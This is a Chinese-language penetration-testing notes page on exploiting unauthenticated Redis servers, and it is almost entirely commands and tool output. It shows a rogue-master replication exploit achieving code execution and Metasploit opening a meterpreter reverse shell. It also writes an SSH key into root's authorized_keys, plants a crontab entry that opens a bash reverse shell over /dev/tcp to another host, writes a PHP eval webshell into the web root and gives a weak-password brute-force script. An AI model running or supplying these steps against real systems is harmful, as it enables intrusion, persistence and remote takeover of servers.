---
title: Redis
category:
- [Kali, Exploit]

tags:
  - null
date: 2020-12-04 20:23:48
top:
updated:
---

REmote DIctionary Server(Redis) 是一个开源的Key-Value数据存储系统，使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型，并提供多种语言的API。


## 信息收集
```zsh
sudo nmap -sV -Pn -T4 -sSU -p 6379,26379 -sC    192.168.79.207                                                   
Host is up (0.00014s latency).

PORT      STATE  SERVICE VERSION
6379/tcp  open   redis   Redis key-value store 4.0.14
26379/tcp closed unknown
6379/udp  closed unknown
26379/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
```

## Redis未授权访问

（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；
（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 

### [redis-rogue-getshell]复现
[redis-rogue-getshell]: https://github.com/vulhub/redis-rogue-getshell

```zsh
./redis-master.py  -r 192.168.79.207 -p 6379 -L 10.211.55.13 -P 4444 -f RedisModulesSDK/exp.so  -c "id"
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$12\r\n10.211.55.13\r\n$4\r\n4444\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC 971afdf273239115adec6f02cc8f8b85a90c25bd 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n'
>> receive data: b'$49\r\neuid=999(redis) gid=999(redis) groups=999(redis)\n\r\n'
euid=999(redis) gid=999(redis) groups=999(redis)

>> send data: b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n'
>> receive data: b'+OK\r\n'
```

### MSF相关模块

>scanner/redis/redis_server
```zsh
msf6 auxiliary(scanner/redis/redis_server) > options

Module options (auxiliary/scanner/redis/redis_server):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   COMMAND   INFO             yes       The Redis command to run
   PASSWORD  foobared         no        Redis password for authentication test
   RHOSTS    192.168.79.207   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     6379             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/redis/redis_server) > run

[+] 192.168.79.207:6379   - Found redis with INFO command: $2701\x0d\x0a# Server\x0d\x0aredis_version:4.0.14\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:3914f9509eb3b682\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 5.4.39-linuxkit x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:6.3.0\x0d\x0aprocess_id:1\x0d\x0arun_id:dffdc0223004bf2ccbcb29dd56d35a30c9645059\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:1612\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:13240592\x0d\x0aexecutable:/data/redis-server\x0d\x0aconfig_file:\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:849288\x0d\x0aused_memory_human:829.38K\x0d\x0aused_memory_rss:4186112\x0d\x0aused_memory_rss_human:3.99M\x0d\x0aused_memory_peak:869304\x0d\x0aused_memory_peak_human:848.93K\x0d\x0aused_memory_peak_perc:97.70%\x0d\x0aused_memory_overhead:836126\x0d\x0aused_memory_startup:786488\x0d\x0aused_memory_dataset:13162\x0d\x0aused_memory_dataset_perc:20.96%\x0d\x0atotal_system_memory:2083606528\x0d\x0atotal_system_memory_human:1.94G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:4.93\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:2.00\x0d\x0aused_cpu_user:0.80\x0d\x0aused_cpu_sys_children:0.09\x0d\x0aused_cpu_user_children:0.00\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace
[*] 192.168.79.207:6379   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> linux/redis/redis_replication_cmd_exec

```zsh
msf6 exploit(linux/redis/redis_replication_cmd_exec) > options

Module options (exploit/linux/redis/redis_replication_cmd_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CUSTOM    true             yes       Whether compile payload file during exploiting
   PASSWORD  foobared         no        Redis password for authentication test
   RHOSTS    192.168.79.207   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     6379             yes       The target port (TCP)
   SRVHOST   10.211.55.13     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   6379             yes       The local port to listen on.

Payload options (linux/x64/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.211.55.13     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

msf6 exploit(linux/redis/redis_replication_cmd_exec) > run

[*] Started reverse TCP handler on 10.211.55.13:4444
[*] 192.168.79.207:6379   - Compile redis module extension file
[+] 192.168.79.207:6379   - Payload generated successfully!
[*] 192.168.79.207:6379   - Listening on 10.211.55.13:6379
[*] 192.168.79.207:6379   - Rogue server close...
[*] 192.168.79.207:6379   - Sending command to trigger payload.
[*] Sending stage (3008420 bytes) to 10.211.55.2
[*] Meterpreter session 1 opened (10.211.55.13:4444 -> 10.211.55.2:59293) at 2020-12-04 04:56:34 -0500
[!] 192.168.79.207:6379   - This exploit may require manual cleanup of './wjkka.so' on the target

meterpreter >
```

### 利用ssh公钥登陆Redis服务器

#### 在本地生成公私钥文件

```zsh
ssh-keygen -t rsa
```

#### 将公钥写入foo.txt文件

```zsh
(echo -e "

"; cat /root/.ssh/id_rsa.pub; echo -e "

") > foo.txt
```

#### 将公钥写入redis服务器

```zsh
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379> config set dir /root/.ssh/
OK
$ 192.168.1.11:6379> config get dir
1) "dir"
2) "/root/.ssh"
$ 192.168.1.11:6379> config set dbfilename "authorized_keys"
OK
$ 192.168.1.11:6379> save
OK
```

#### 登陆Redis服务器

```zsh
ssh -i id_rsa root@192.168.1.11
```


### 利用crontab反弹shell
```bash
redis-cli -h 192.168.0.104
set xxx "

*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.104/4444 0>&1

"
config set dir /var/spool/cron
config set dbfilename root
save
```


### 利用Redis写入webshell

#### 生成webshell.php脚本

```zsh
<?php 
set_time_limit(0);
$fp=fopen('bmjoker.php','w');
fwrite($fp,'<?php @eval($_POST["pass"]);?>');
exit();
?>
```

#### 将webshell.php前后空2行
```zsh
( echo -e "

"; cat webshell.php ; echo -e "

") > webshell.txt 
```

#### 将webshell文件写入redis服务器中

```zsh
$ cat webshell.txt | redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379> config set dir /var/www/html/
OK
$ 192.168.1.11:6379> config get dir
1) "dir"
2) "/var/www/html/"
$ 192.168.1.11:6379> config set dbfilename "webshell.php"
OK
$ 192.168.1.11:6379> save
OK
```

使用behind/antsword等客户端连接


## 测试是否存在未授权或弱口令的小脚本
```python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import socket
import sys
PASSWORD_DIC=['redis','root','oracle','password','p@aaw0rd','abc123!','123456','admin']
def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("INFO
")
        result = s.recv(1024)
        if "redis_version" in result:
            return u"未授权访问"
        elif "Authentication" in result:
            for pass_ in PASSWORD_DIC:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send("AUTH %s
" %(pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    return u"存在弱口令，密码：%s" % (pass_)
    except Exception, e:
        pass
if __name__ == '__main__':
    ip=sys.argv[1]
    port=sys.argv[2]
    print check(ip,port, timeout=10)
```
